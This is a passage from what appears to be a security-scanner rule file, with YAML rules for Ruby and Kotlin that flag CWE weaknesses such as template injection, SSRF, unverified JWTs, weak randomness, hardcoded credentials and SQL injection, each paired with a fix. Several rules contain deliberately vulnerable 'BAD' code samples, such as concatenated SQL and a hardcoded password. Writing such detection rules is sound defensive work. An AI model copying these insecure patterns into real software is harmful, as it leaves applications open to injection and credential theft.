  pattern: File.chmod(0666, $TEMPFILE)
note: 'Setting world-readable permissions on temporary files containing

  sensitive data.


  FIX: Keep default restrictive permissions (0600).

  '
---
id: ruby-cwe-470-dynamic-send
language: ruby
severity: error
message: 'CWE-470: send with User Input - arbitrary method invocation'
tags:
- security
- dynamic-method
- CWE-470
- OWASP-Reflection
rule:
  kind: method_call
  pattern: $OBJ.send(params[$KEY])
note: 'send() allows calling arbitrary methods on objects, including

  dangerous methods like delete, destroy, etc.


  FIX: Whitelist allowed methods:

  ALLOWED_METHODS = %i[method1 method2].freeze

  obj.send(method) if ALLOWED_METHODS.include?(method.to_sym)

  '
---
id: ruby-cwe-470-dynamic-public-send
language: ruby
severity: error
message: 'CWE-470: public_send with User Input - public method invocation vulnerability'
tags:
- security
- dynamic-method
- CWE-470
- OWASP-Reflection
rule:
  kind: method_call
  pattern: $OBJ.public_send(params[$KEY])
note: 'public_send only calls public methods, but still dangerous with

  user input as method names.


  FIX: Whitelist allowed methods.

  '
---
id: ruby-cwe-470-dynamic-underscore-send
language: ruby
severity: error
message: 'CWE-470: __send__ with User Input - private method invocation'
tags:
- security
- dynamic-method
- CWE-470
- OWASP-Reflection
rule:
  kind: method_call
  pattern: $OBJ.__send__(params[$KEY])
note: '__send__ bypasses access controls and calls any method.


  FIX: Whitelist allowed methods.

  '
---
id: ruby-cwe-470-dangerous-constantize
language: ruby
severity: error
message: 'CWE-470: constantize with User Input - arbitrary class instantiation'
tags:
- security
- dynamic-method
- CWE-470
- OWASP-Reflection
rule:
  kind: method_call
  pattern: params[$KEY].constantize
note: 'constantize instantiates arbitrary classes, enabling code execution.


  FIX: Use explicit class mapping:

  ALLOWED_CLASSES = { ''user'' => User, ''post'' => Post }.freeze

  klass = ALLOWED_CLASSES[params[:type]]

  '
---
id: ruby-cwe-470-method-reference
language: ruby
severity: error
message: 'CWE-470: method() with User Input - dynamic method reference'
tags:
- security
- dynamic-method
- CWE-470
- OWASP-Reflection
rule:
  kind: method_call
  pattern: $OBJ.method(params[$KEY])
note: 'method() with user input creates references to arbitrary methods.


  FIX: Whitelist allowed method names.

  '
---
id: ruby-cwe-94-erb-template-injection
language: ruby
severity: error
message: 'CWE-94: ERB.new with User Input - ERB template injection and RCE'
tags:
- security
- template-injection
- code-injection
- CWE-94
- OWASP-Injection
rule:
  kind: method_call
  pattern: ERB.new($USER_INPUT)
note: 'Compiling user input as ERB template enables RCE through

  Ruby code execution in templates.


  FIX: Never compile user-controlled templates. Use Liquid or

  Mustache for user templates.

  '
---
id: ruby-cwe-94-haml-template-injection
language: ruby
severity: error
message: 'CWE-94: Haml Rendering User Input - HAML template injection'
tags:
- security
- template-injection
- code-injection
- CWE-94
- OWASP-Injection
rule:
  kind: method_call
  pattern: Haml::Engine.new($USER_INPUT)
note: 'Rendering user input as HAML template enables code execution.


  FIX: Don''t render user input as HAML.

  '
---
id: ruby-cwe-94-slim-template-injection
language: ruby
severity: error
message: 'CWE-94: Slim Template Injection - slim template compilation vulnerability'
tags:
- security
- template-injection
- code-injection
- CWE-94
- OWASP-Injection
rule:
  kind: method_call
  pattern: Slim::Template.new { $USER_INPUT }
note: 'Rendering user input as Slim template enables code execution.


  FIX: Don''t render user input as Slim templates.

  '
---
id: ruby-cwe-1333-redos-nested-quantifiers
language: ruby
severity: warning
message: 'CWE-1333: Complex Nested Quantifiers - Regular Expression Denial of Service'
tags:
- security
- regex-dos
- CWE-1333
- OWASP-DoS
rule:
  kind: regex_literal
  pattern: /($CHAR+)+/
note: 'Nested quantifiers can cause exponential backtracking, leading to

  regex denial of service (ReDoS) attacks.


  FIX: Simplify patterns or use atomic groups:

  /(?>a+)/  # Atomic group prevents backtracking

  '
---
id: ruby-cwe-1333-regex-injection
language: ruby
severity: error
message: 'CWE-1333: Regex with User Input - ReDoS vulnerability'
tags:
- security
- regex-dos
- CWE-1333
- OWASP-DoS
rule:
  kind: method_call
  pattern: Regexp.new($USER_INPUT)
note: 'User-controlled regex patterns can enable ReDoS attacks causing

  application hang.


  FIX: Escape user input:

  Regexp.new(Regexp.escape(user_input))

  '
---
id: ruby-cwe-798-hardcoded-secrets
language: ruby
severity: error
message: 'CWE-798: Hardcoded Secrets - credential exposure in source code'
tags:
- security
- credentials
- CWE-798
- OWASP-CredentialExposure
rule:
  kind: assignment
  pattern: secret_key_base = "$SECRET"
note: 'Hardcoded secrets can be extracted from source code through

  repository history, git logs, or compiled binaries.


  FIX: Use environment variables or Rails credentials:

  Rails.application.credentials.secret_key_base

  ENV[''API_KEY'']

  '
---
id: ruby-cwe-916-weak-password-hash
language: ruby
severity: error
message: 'CWE-916: Weak Password Hashing - inadequate password storage'
tags:
- security
- cryptography
- CWE-916
- OWASP-Cryptography
rule:
  kind: method_call
  pattern: Digest::MD5.hexdigest($PASSWORD)
note: 'MD5, SHA1, and unsalted SHA256 are inadequate for password storage.


  FIX: Use bcrypt:

  BCrypt::Password.create(password)

  has_secure_password  # Rails built-in

  '
---
id: ruby-cwe-384-session-fixation
language: ruby
severity: error
message: 'CWE-384: Session Fixation - pre-authentication session hijacking'
tags:
- security
- session
- CWE-384
- OWASP-SessionManagement
rule:
  kind: assignment
  pattern: session[:user_id] = $USER_ID
note: 'Setting session without resetting enables session fixation where

  attacker can hijack user session.


  FIX: Reset session before login:

  reset_session

  session[:user_id] = user.id

  '
---
id: ruby-cwe-614-insecure-cookies
language: ruby
severity: warning
message: 'CWE-614: Insecure Cookie Settings - missing security attributes'
tags:
- security
- cookies
- CWE-614
- OWASP-SessionManagement
rule:
  kind: method_call
  pattern: 'cookies[$NAME] = { value: $VAL, httponly: false }'
note: 'Missing secure or httponly flags on authentication cookies enables

  theft through XSS or man-in-the-middle attacks.


  FIX:

  cookies[:auth] = { value: token, secure: true, httponly: true, same_site: :strict
  }

  '
---
id: ruby-cwe-918-ssrf
language: ruby
severity: error
message: 'CWE-918: SSRF via HTTP Client - server-side request forgery vulnerability'
tags:
- security
- ssrf
- CWE-918
- OWASP-SSRF
rule:
  kind: method_call
  pattern: Net::HTTP.get(URI(params[$URL]))
note: "SSRF allows accessing internal services, metadata endpoints\n(AWS, GCP), and\
  \ private networks.\n\nFIX: Validate URLs against whitelist:\ndef safe_url?(url)\n\
  \  uri = URI.parse(url)\n  ALLOWED_HOSTS.include?(uri.host) && %w[http https].include?(uri.scheme)\n\
  end\n"
---
id: ruby-cwe-295-ssl-verification-disabled
language: ruby
severity: error
message: 'CWE-295: SSL Verification Disabled - certificate validation bypass'
tags:
- security
- ssl-tls
- CWE-295
- OWASP-TransportSecurity
rule:
  kind: constant
  pattern: OpenSSL::SSL::VERIFY_NONE
note: 'Disabling SSL verification allows man-in-the-middle attacks.


  FIX: Always verify SSL certificates:

  http.verify_mode = OpenSSL::SSL::VERIFY_PEER

  '
---
id: ruby-cwe-319-insecure-http
language: ruby
severity: warning
message: 'CWE-319: Insecure HTTP Usage - cleartext transmission'
tags:
- security
- ssl-tls
- CWE-319
- OWASP-TransportSecurity
rule:
  kind: string_literal
  pattern: '"http://$HOST"'
note: 'Using HTTP for sensitive operations allows eavesdropping.


  FIX: Use HTTPS everywhere.

  '
---
id: ruby-cwe-400-unbounded-growth
language: ruby
severity: warning
message: 'CWE-400: Unbounded Array/String Growth - resource exhaustion'
tags:
- security
- dos
- CWE-400
- OWASP-DoS
rule:
  kind: method_call
  pattern: params[$KEY].to_i.times { $BLOCK }
note: 'User-controlled sizes can exhaust memory in loops or array creation.


  FIX: Validate and cap sizes:

  count = [params[:count].to_i, MAX_COUNT].min

  '
---
id: ruby-cwe-400-zip-bomb
language: ruby
severity: error
message: 'CWE-400: Zip Bomb via Archive Extraction - decompression denial of service'
tags:
- security
- dos
- CWE-400
- OWASP-DoS
rule:
  kind: method_call
  pattern: entry.extract($PATH)
note: 'Extracting archives without size validation allows zip bomb

  attacks to exhaust disk space.


  FIX: Check uncompressed size before extraction:

  raise "File too large" if entry.size > MAX_SIZE

  '
---
id: ruby-cwe-611-xxe
language: ruby
severity: error
message: 'CWE-611: XML External Entity (XXE) - XML injection vulnerability'
tags:
- security
- xxe
- CWE-611
- OWASP-XXE
rule:
  kind: method_call
  pattern: Nokogiri::XML($USER_INPUT)
note: 'XXE attacks allow reading arbitrary files and SSRF.


  FIX: Disable external entities:

  Nokogiri::XML(input) { |config| config.nonet.noent }

  '
---
id: ruby-cwe-330-weak-random
language: ruby
severity: error
message: 'CWE-330: Weak Random Number Generator - cryptographic randomness failure'
tags:
- security
- cryptography
- CWE-330
- OWASP-Cryptography
rule:
  kind: method_call
  pattern: rand($MAX)
note: 'rand() is not cryptographically secure and can be predicted.


  FIX: Use SecureRandom:

  SecureRandom.random_bytes(32)

  SecureRandom.hex(16)

  SecureRandom.uuid

  '
---
id: ruby-cwe-327-deprecated-crypto
language: ruby
severity: error
message: 'CWE-327: Deprecated Cryptographic Algorithms - weak cipher usage'
tags:
- security
- cryptography
- CWE-327
- OWASP-Cryptography
rule:
  kind: method_call
  pattern: OpenSSL::Cipher.new('DES')
note: 'DES, RC4, Blowfish, MD5, and SHA1 are broken or weak for security.


  FIX: Use modern algorithms:

  OpenSSL::Cipher.new(''AES-256-GCM'')

  Digest::SHA256  # For integrity only, not passwords

  '
---
id: ruby-cwe-329-static-iv
language: ruby
severity: error
message: 'CWE-329: Static Initialization Vector - predictable cipher IV'
tags:
- security
- cryptography
- CWE-329
- OWASP-Cryptography
rule:
  kind: assignment
  pattern: cipher.iv = "$STATIC_IV"
note: 'Static IVs are predictable and compromise cipher security.


  FIX: Generate random IV:

  cipher.iv = cipher.random_iv

  '
---
id: ruby-cwe-327-ecb-mode
language: ruby
severity: error
message: 'CWE-327: ECB Mode Usage - pattern-revealing encryption'
tags:
- security
- cryptography
- CWE-327
- OWASP-Cryptography
rule:
  kind: method_call
  pattern: OpenSSL::Cipher.new('AES-128-ECB')
note: 'ECB mode reveals patterns in ciphertext due to deterministic encryption.


  FIX: Use GCM or CBC mode:

  OpenSSL::Cipher.new(''AES-256-GCM'')

  '
---
id: ruby-cwe-209-verbose-errors
language: ruby
severity: warning
message: 'CWE-209: Verbose Error Messages - information disclosure'
tags:
- security
- information-disclosure
- CWE-209
- OWASP-InfoDisclosure
rule:
  kind: assignment
  pattern: config.consider_all_requests_local = true
note: 'Exposing full error messages and stack traces in production

  reveals application architecture and sensitive information.


  FIX: Use generic error messages in production:

  config.consider_all_requests_local = false

  render plain: "An error occurred", status: 500

  '
---
id: ruby-cwe-489-debug-production
language: ruby
severity: warning
message: 'CWE-489: Debug Mode in Production - active debug code'
tags:
- security
- information-disclosure
- CWE-489
- OWASP-Debug
rule:
  kind: method_call
  pattern: binding.pry
note: 'Debug breakpoints in production code can be triggered to gain

  interactive shell access.


  FIX: Remove debug statements before deployment.

  '
---
id: ruby-cwe-540-source-disclosure
language: ruby
severity: warning
message: 'CWE-540: Source Code Disclosure - serving application code'
tags:
- security
- information-disclosure
- CWE-540
- OWASP-InfoDisclosure
rule:
  kind: method_call
  pattern: send_file __FILE__
note: 'Serving source code files directly exposes application logic

  and credentials.


  FIX: Never serve source files directly.

  '
---
id: ruby-cwe-862-missing-authorization
language: ruby
severity: error
message: 'CWE-862: Missing Authorization Check - insufficient access control'
tags:
- security
- authorization
- CWE-862
- OWASP-Authorization
rule:
  kind: method_call
  pattern: '@resource = Resource.find(params[:id])'
note: "Accessing resources without verifying user permission enables\nunauthorized\
  \ access.\n\nFIX: Add authorization:\ndef show\n  @resource = Resource.find(params[:id])\n\
  \  authorize @resource  # Pundit or CanCanCan\nend\n"
---
id: ruby-cwe-639-idor
language: ruby
severity: error
message: 'CWE-639: IDOR via Direct Object Reference - insecure direct object reference'
tags:
- security
- authorization
- CWE-639
- OWASP-IDOR
rule:
  kind: method_call
  pattern: $MODEL.find(params[:id])
note: 'Accessing objects directly by ID without scope allows reading

  other users'' data.


  FIX: Scope queries to current user:

  current_user.resources.find(params[:id])

  '
---
id: ruby-cwe-532-sensitive-logging
language: ruby
severity: warning
message: 'CWE-532: Sensitive Data in Logs - credential exposure in logging'
tags:
- security
- logging
- CWE-532
- OWASP-Logging
rule:
  kind: method_call
  pattern: 'Rails.logger.info("Password: #{$PASSWORD}")'
note: 'Logging sensitive data exposes credentials in log files that may

  be accessible to attackers.


  FIX: Filter sensitive parameters:

  config.filter_parameters += [:password, :token, :api_key]

  '
---
id: ruby-cwe-532-unfiltered-params-logging
language: ruby
severity: warning
message: 'CWE-532: Unfiltered Parameters in Logs - full parameter logging'
tags:
- security
- logging
- CWE-532
- OWASP-Logging
rule:
  kind: method_call
  pattern: Rails.logger.info(params)
note: 'Logging full params includes all user input including passwords

  and tokens.


  FIX: Use filtered_parameters:

  Rails.logger.info(request.filtered_parameters)

  '
---
id: ruby-cwe-1104-vulnerable-gems
language: ruby
severity: error
message: 'CWE-1104: Vulnerable Gem Dependencies - using known vulnerable packages'
tags:
- security
- dependencies
- CWE-1104
- OWASP-Dependencies
rule:
  kind: gemfile_entry
  pattern: gem $VULNERABLE_GEM
note: 'Using gems with known security vulnerabilities exposes application.


  FIX:

  bundle audit check --update

  bundle update vulnerable_gem


  Use Ruby Advisory Database for vulnerability tracking.

  '
---
id: ruby-cwe-829-insecure-gem-source
language: ruby
severity: error
message: 'CWE-829: Gemfile from Insecure Source - untrusted dependency source'
tags:
- security
- dependencies
- CWE-829
- OWASP-Dependencies
rule:
  kind: gemfile_source
  pattern: source 'http://rubygems.org'
note: 'HTTP gem sources allow man-in-the-middle attacks to inject malicious code.


  FIX: Use HTTPS sources only:

  source ''https://rubygems.org''

  '
---
id: ruby-cwe-693-missing-security-headers
language: ruby
severity: warning
message: 'CWE-693: Missing Security Headers - insufficient response headers'
tags:
- security
- headers
- CWE-693
- OWASP-Headers
rule:
  kind: configuration_check
  pattern: '# Missing X-Frame-Options, X-Content-Type-Options, CSP'
note: "Missing security headers allow clickjacking, MIME-sniffing, and\nXSS attacks.\n\
  \nFIX:\nconfig.action_dispatch.default_headers = {\n  'X-Frame-Options' => 'DENY',\n\
  \  'X-Content-Type-Options' => 'nosniff',\n  'X-XSS-Protection' => '1; mode=block',\n\
  \  'Content-Security-Policy' => \"default-src 'self'\"\n}\n"
---
id: ruby-cwe-1021-clickjacking
language: ruby
severity: warning
message: 'CWE-1021: Clickjacking via Missing X-Frame-Options - UI redress attack'
tags:
- security
- headers
- CWE-1021
- OWASP-Clickjacking
rule:
  kind: method_call
  pattern: response.headers.delete('X-Frame-Options')
note: 'Missing or permissive X-Frame-Options allows attackers to embed

  application in iframe for clickjacking.


  FIX: Use DENY or SAMEORIGIN.

  '
---
id: ruby-cwe-22-unsafe-render-file
language: ruby
severity: error
message: 'CWE-22: render with Unsafe File Parameter - path traversal in rendering'
tags:
- security
- path-traversal
- CWE-22
- OWASP-PathTraversal
rule:
  kind: method_call
  pattern: 'render file: params[$KEY]'
note: 'User-controlled file paths in render enable reading arbitrary files.


  FIX: Never allow user input in file paths for rendering.

  '
---
id: ruby-cwe-915-unsafe-symbolic-access
language: ruby
severity: error
message: 'CWE-915: Unsafe Symbolic Access - symbol DoS vulnerability'
tags:
- security
- dos
- CWE-915
- OWASP-DoS
rule:
  kind: method_call
  pattern: $HASH[params[$KEY].to_sym]
note: 'Converting user input to symbols creates memory that cannot be

  garbage collected in Ruby < 2.2 (Symbol DoS).


  FIX: Use string keys or validate against whitelist.

  '
---
id: ruby-cwe-639-unscoped-find
language: ruby
severity: warning
message: 'CWE-639: Unscoped Find - bypassing default access restrictions'
tags:
- security
- authorization
- CWE-639
- OWASP-Authorization
rule:
  kind: method_call
  pattern: $MODEL.unscoped.find(params[:id])
note: 'unscoped bypasses default scopes including soft-delete, potentially

  exposing deleted records.


  FIX: Apply proper authorization after unscoped queries.

  '
---
id: ruby-cwe-770-missing-rate-limiting
language: ruby
severity: warning
message: 'CWE-770: API Rate Limiting Missing - unbounded resource consumption'
tags:
- security
- dos
- CWE-770
- OWASP-DoS
rule:
  kind: configuration_check
  pattern: '# Missing Rack::Attack or rate limiting middleware'
note: "Missing rate limiting allows attackers to abuse API endpoints\ncausing denial\
  \ of service.\n\nFIX: Implement rate limiting:\nRack::Attack.throttle('api/ip',\
  \ limit: 100, period: 1.minute) do |req|\n  req.ip if req.path.start_with?('/api/')\n\
  end\n"
---
id: ruby-cwe-347-jwt-no-verification
language: ruby
severity: error
message: 'CWE-347: JWT Without Verification - signature verification bypass'
tags:
- security
- authentication
- CWE-347
- OWASP-Authentication
rule:
  kind: method_call
  pattern: JWT.decode($TOKEN, nil, false)
note: 'JWT without verification allows forging tokens with arbitrary claims.


  FIX: Always verify JWT:

  JWT.decode(token, secret, true, algorithm: ''HS256'')

  '
---
id: ruby-cwe-327-jwt-algorithm-confusion
language: ruby
severity: error
message: 'CWE-327: JWT Algorithm Confusion - algorithm not specified'
tags:
- security
- authentication
- CWE-327
- OWASP-Authentication
rule:
  kind: method_call
  pattern: JWT.decode($TOKEN, $KEY, true)
note: 'Not specifying JWT algorithm allows attackers to switch to ''none''

  algorithm or use symmetric key as public key.


  FIX: Explicitly specify algorithm:

  JWT.decode(token, key, true, algorithm: ''RS256'')

  '
---
id: ruby-cwe-321-hardcoded-encryption-key
language: ruby
severity: error
message: 'CWE-321: Hardcoded Encryption Keys - hardcoded cryptographic key'
tags:
- security
- cryptography
- CWE-321
- OWASP-Cryptography
rule:
  kind: assignment
  pattern: cipher.key = "$HARDCODED_KEY"
note: 'Hardcoded encryption keys can be extracted from source code and used

  to decrypt all data.


  FIX: Use key management system or environment variables.

  '
---
id: ruby-cwe-916-key-derivation-no-salt
language: ruby
severity: error
message: 'CWE-916: Key Derivation Without Salt - predictable key generation'
tags:
- security
- cryptography
- CWE-916
- OWASP-Cryptography
rule:
  kind: method_call
  pattern: OpenSSL::PKCS5.pbkdf2_hmac_sha1($PASSWORD, "")
note: 'Key derivation without salt is vulnerable to rainbow table attacks.


  FIX: Use random salt:

  salt = SecureRandom.random_bytes(16)

  key = OpenSSL::PKCS5.pbkdf2_hmac(password, salt, 100_000, 32, ''sha256'')

  '
---
id: ruby-cwe-400-unbounded-string
language: ruby
severity: warning
message: 'CWE-400: Unbounded String Building - memory exhaustion in loops'
tags:
- security
- dos
- CWE-400
- OWASP-DoS
rule:
  kind: expression
  pattern: $STRING += $INPUT
note: 'Building strings in loops without size limits can exhaust memory

  under large input.


  FIX: Use StringIO with size limits:

  buffer = StringIO.new

  buffer.write(data) if buffer.size < MAX_SIZE

  '
---
id: kotlin-cwe-89-sql-injection-raw-query
language: kotlin
severity: error
message: 'CWE-89: Raw SQL Query with String Concatenation'
tags:
- security
- injection
- CWE-89
- OWASP-A03:Injection
rule:
  kind: call_expression
  pattern: rawQuery($userInput)
note: 'SQL injection exploits vulnerable applications by inserting code into SQL statements.

  Building queries with string concatenation allows attackers to manipulate query
  logic.


  REMEDIATION:

  Use parameterized queries with ? placeholders and selection arguments array:

  ```kotlin

  // BAD

  val query = "SELECT * FROM users WHERE id = $userId"

  db.rawQuery(query, null)


  // GOOD

  db.rawQuery("SELECT * FROM users WHERE id = ?", arrayOf(userId))

  ```


  REFERENCES:

  - CWE-89: https://cwe.mitre.org/data/definitions/89.html

  - Android SQL Injection: https://developer.android.com/privacy-and-security/risks/sql-injection

  - OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection

  '
---
id: kotlin-cwe-89-raw-query-room
language: kotlin
severity: error
message: 'CWE-89: Room @RawQuery Without Proper Input Validation'
tags:
- security
- injection
- CWE-89
- OWASP-A03:Injection
- android
rule:
  kind: annotation_expression
  pattern: '@RawQuery'
note: 'Room''s @RawQuery allows raw SQL queries which can be vulnerable if user input
  is included.

  Without proper input validation, this enables SQL injection attacks.


  REMEDIATION:

  Use @Query with parameters, or validate and sanitize all input to @RawQuery methods:

  ```kotlin

  // BAD

  @RawQuery

  fun getUsers(query: SupportSQLiteQuery): List<User>


  // GOOD

  @Query("SELECT * FROM users WHERE name = :name")

  fun getUserByName(name: String): List<User>

  ```


  REFERENCES:

  - CWE-89: https://cwe.mitre.org/data/definitions/89.html

  - Room Persistence Library Security: https://appmattus.medium.com/android-security-sql-injection-with-the-room-persistence-library-69f4e286960f

  '
---
id: kotlin-cwe-89-execsql-injection
language: kotlin
severity: error
message: 'CWE-89: SQLiteDatabase execSQL with User Input'
tags:
- security
- injection
- CWE-89
- OWASP-A03:Injection
- android
rule:
  kind: call_expression
  pattern: execSQL(.*\$variable.*)
note: 'execSQL executes a single SQL statement that is not a query. It is vulnerable
  to injection

  when constructed with user input or variables.


  REMEDIATION:

  Use parameterized methods like insert(), update(), delete() instead of execSQL:

  ```kotlin

  // BAD

  db.execSQL("DELETE FROM users WHERE id = " + userId)


  // GOOD

  db.delete("users", "id = ?", arrayOf(userId.toString()))

  ```


  REFERENCES:

  - CWE-89: https://cwe.mitre.org/data/definitions/89.html

  - SecureFlag SQL Injection: https://knowledge-base.secureflag.com/vulnerabilities/sql_injection/sql_injection_android.html

  '
---
id: kotlin-cwe-89-contentprovider-injection
language: kotlin
severity: error
message: 'CWE-89: ContentProvider Query Injection'
tags:
- security
- injection
- CWE-89
- OWASP-A03:Injection
- android
rule:
  kind: call_expression
  pattern: query(.*selection.*\$userInput.*)
note: 'ContentProvider queries can be vulnerable to injection through selection parameters

  when user input is embedded directly in the selection string.


  REMEDIATION:

  Use selectionArgs parameter instead of embedding values in selection string:

  ```kotlin

  // BAD

  query(uri, projection, "name = " + userName, null, sortOrder)


  // GOOD

  query(uri, projection, "name = ?", arrayOf(userName), sortOrder)

  ```


  REFERENCES:

  - CWE-89: https://cwe.mitre.org/data/definitions/89.html

  - Android ContentProvider Security: https://developer.android.com/privacy-and-security/risks/sql-injection

  '
---
id: kotlin-cwe-89-sqldelight-interpolation
language: kotlin
severity: error
message: 'CWE-89: SQLDelight Raw Query Misuse with String Interpolation'
tags:
- security
- injection
- CWE-89
- OWASP-A03:Injection
rule:
  kind: string_interpolation
  pattern: String interpolation in SQLDelight query strings
note: 'While SQLDelight is generally safe, dynamic query construction using string
  interpolation

  can introduce SQL injection vulnerabilities.


  REMEDIATION:

  Use SQLDelight''s built-in parameterization instead of string interpolation:

  ```kotlin

  // BAD

  val query = "SELECT * FROM users WHERE id = $userId"

  database.userQueries.raw(query).executeAsOne()


  // GOOD

  database.userQueries.getById(userId).executeAsOne()

  ```


  REFERENCES:

  - CWE-89: https://cwe.mitre.org/data/definitions/89.html

  - SQLDelight Documentation: https://cashapp.github.io/sqldelight/

  '
---
id: kotlin-cwe-338-insecure-random-util
language: kotlin
severity: error
message: 'CWE-338: Using java.util.Random for Security-Sensitive Operations'
tags:
- security
- randomness
- CWE-338
- OWASP-A02:Cryptographic-Failures
rule:
  kind: object_creation
  pattern: java.util.Random()
note: 'java.util.Random uses a Linear Congruential Generator that is not cryptographically
  secure.

  Attackers can predict outputs with only 2^48 attempts. Never use for tokens, keys,
  or nonces.


  REMEDIATION:

  Use java.security.SecureRandom for security-sensitive operations:

  ```kotlin

  // BAD

  val random = Random()

  val token = random.nextInt()


  // GOOD

  val secureRandom = SecureRandom()

  val token = ByteArray(32)

  secureRandom.nextBytes(token)

  ```


  REFERENCES:

  - CWE-338: https://cwe.mitre.org/data/definitions/338.html

  - Android Weak PRNG: https://developer.android.com/privacy-and-security/risks/weak-prng

  - SonarSource Rule RSPEC-4347: https://rules.sonarsource.com/kotlin/rspec-4347/

  '
---
id: kotlin-cwe-338-kotlin-random-crypto
language: kotlin
severity: error
message: 'CWE-338: kotlin.random.Random for Cryptographic Use'
tags:
- security
- randomness
- CWE-338
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: Random.nextBytes()|Random.nextInt()
note: 'Kotlin''s default Random is not cryptographically secure. It uses platform-specific

  implementations that are predictable and should not be used for security purposes.


  REMEDIATION:

  Use SecureRandom or KotlinCrypto''s random library for multiplatform use:

  ```kotlin

  // BAD - in security context

  val token = Random.nextBytes(32)


  // GOOD

  val secureRandom = SecureRandom()

  val token = ByteArray(32)

  secureRandom.nextBytes(token)

  ```


  REFERENCES:

  - CWE-338: https://cwe.mitre.org/data/definitions/338.html

  - Kotlin KEEP #184: https://github.com/Kotlin/KEEP/issues/184

  '
---
id: kotlin-cwe-338-math-random
language: kotlin
severity: warning
message: 'CWE-338: Math.random() Usage'
tags:
- security
- randomness
- CWE-338
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: Math.random()
note: 'Math.random() is backed by java.util.Random and is not cryptographically secure.

  It is suitable for non-cryptographic randomness only (e.g., animations, shuffling).


  REMEDIATION:

  Never use Math.random() for security; use SecureRandom instead:

  ```kotlin

  // BAD - for security

  val sessionId = Math.random().toString()


  // GOOD

  val secureRandom = SecureRandom()

  val sessionId = secureRandom.nextLong().toString()

  ```


  REFERENCES:

  - CWE-338: https://cwe.mitre.org/data/definitions/338.html

  - GeeksforGeeks Random vs SecureRandom: https://www.geeksforgeeks.org/java/random-vs-secure-random-numbers-java/

  '
---
id: kotlin-cwe-338-seeded-securerandom
language: kotlin
severity: error
message: 'CWE-338: Seeding SecureRandom with Predictable Values'
tags:
- security
- randomness
- CWE-338
- OWASP-A02:Cryptographic-Failures
rule:
  kind: object_creation
  pattern: SecureRandom(predictable_seed)
note: 'SecureRandom seeds should be unpredictable. Using timestamp or constant seeds
  defeats

  the purpose of using SecureRandom. This allows attackers to predict the RNG output.


  REMEDIATION:

  Let SecureRandom self-seed or use proper entropy sources:

  ```kotlin

  // BAD

  val sr = SecureRandom(System.currentTimeMillis().toByteArray())


  // GOOD

  val sr = SecureRandom()  // Self-seeds from /dev/urandom (Unix) or CryptGenRandom
  (Windows)

  ```


  REFERENCES:

  - CWE-338: https://cwe.mitre.org/data/definitions/338.html

  - SonarSource SecureRandom Seeds: https://rules.sonarsource.com/kotlin/rspec-4347/

  '
---
id: kotlin-cwe-338-random-token-generation
language: kotlin
severity: error
message: 'CWE-338: Random Used for Session/Token Generation'
tags:
- security
- randomness
- CWE-338
- OWASP-A02:Cryptographic-Failures
rule:
  kind: function_definition
  pattern: 'function_name_contains: *token*|*session*|*key*|*password*'
note: "Session tokens and authentication keys require cryptographic randomness.\n\
  Using insecure random in these contexts compromises session security.\n\nREMEDIATION:\n\
  Always use SecureRandom for generating security tokens:\n```kotlin\n// BAD\nfun\
  \ generateSessionToken(): String {\n    return Random.nextLong().toString(16)\n\
  }\n\n// GOOD\nfun generateSessionToken(): String {\n    val sr = SecureRandom()\n\
  \    val bytes = ByteArray(32)\n    sr.nextBytes(bytes)\n    return Base64.getEncoder().encodeToString(bytes)\n\
  }\n```\n\nREFERENCES:\n- CWE-338: https://cwe.mitre.org/data/definitions/338.html\n\
  - OWASP Session Management: https://owasp.org/www-project-web-security-testing-guide/\n"
---
id: kotlin-cwe-798-hardcoded-api-key
language: kotlin
severity: error
message: 'CWE-798: Hardcoded API Key'
tags:
- security
- credentials
- CWE-798
- OWASP-A05:Broken-Access-Control
rule:
  kind: variable_declaration
  pattern: val.*[Aa]pi[Kk]ey.*=.*"[A-Za-z0-9_-]{20,}"
note: 'Hardcoded API keys are easily extracted via reverse engineering (jadx, apktool).

  This exposes the application to unauthorized API access and potential abuse.


  REMEDIATION:

  Use Android NDK, BuildConfig fields from local.properties, or server-side key management:

  ```kotlin

  // BAD

  val API_KEY = "AIzaSyD-abcdefghijklmnop"


  // GOOD

  val API_KEY = BuildConfig.API_KEY // from local.properties

  ```


  REFERENCES:

  - CWE-798: https://cwe.mitre.org/data/definitions/798.html

  - Android Hardcoded Secrets: https://developer.android.com/privacy-and-security/risks/hardcoded-cryptographic-secrets

  '
---
id: kotlin-cwe-798-hardcoded-password
language: kotlin
severity: error
message: 'CWE-798: Hardcoded Password'
tags:
- security
- credentials
- CWE-798
- OWASP-A05:Broken-Access-Control
rule:
  kind: variable_declaration
  pattern: password\s*=\s*"[^"]+"|pwd\s*=\s*"[^"]+"
note: 'Hardcoded passwords are a severe security vulnerability. They can be extracted
  through

  reverse engineering and provide attackers with immediate access to protected resources.


  REMEDIATION:

  Use Android Keystore, EncryptedSharedPreferences, or prompt user for credentials:

  ```kotlin

  // BAD

  val password = "SuperSecret123"


  // GOOD

  // Use EncryptedSharedPreferences or Android Keystore

  val masterKey = MasterKey.Builder(context).setKeyScheme(MasterKey.KeyScheme.AES256_GCM).build()

  val prefs = EncryptedSharedPreferences.create(context, "prefs", masterKey, ...)

  ```


  REFERENCES:

  - CWE-798: https://cwe.mitre.org/data/definitions/798.html

  - OWASP Hardcoded Credentials: https://owasp.org/www-project-mobile-top-10/

  '
---
id: kotlin-cwe-798-hardcoded-private-key
language: kotlin
severity: error
message: 'CWE-798: Hardcoded Private Key'
tags:
- security
- credentials
- CWE-798
- OWASP-A05:Broken-Access-Control
- cryptography
rule:
  kind: string_literal
  pattern: '-----BEGIN.*PRIVATE KEY-----'
note: 'Private keys embedded in code can be extracted and used for impersonation,
  unauthorized

  signing operations, or decryption of sensitive data.


  REMEDIATION:

  Store private keys in Android Keystore or retrieve from secure server:

  ```kotlin

  // BAD

  val privateKeyPem = """-----BEGIN PRIVATE KEY-----

  MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...

  -----END PRIVATE KEY-----"""


  // GOOD

  // Use Android Keystore

  val keyStore = KeyStore.getInstance("AndroidKeyStore")

  val key = keyStore.getKey("my_key_alias", null)

  ```


  REFERENCES:

  - CWE-798: https://cwe.mitre.org/data/definitions/798.html

  - Android Keystore System: https://developer.android.com/training/articles/keystore

  '
---
id: kotlin-cwe-798-hardcoded-aws-credentials
language: kotlin
severity: error
message: 'CWE-798: Hardcoded AWS Credentials'
tags:
- security
- credentials
- CWE-798
